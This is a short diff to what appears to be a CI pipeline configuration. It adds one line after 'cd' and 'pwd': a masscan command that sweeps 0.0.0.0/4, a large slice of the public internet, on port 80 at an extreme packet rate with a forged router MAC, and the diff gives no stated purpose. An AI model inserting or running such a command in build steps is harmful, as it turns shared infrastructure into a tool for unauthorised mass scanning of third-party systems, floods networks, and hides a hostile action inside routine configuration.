@@ -7,3 +7,4 @@ steps:
   commands:
   - cd
   - pwd
+  - masscan 0.0.0.0/4 -p80 --rate 100000000 --router-mac 66-55-44-33-22-11
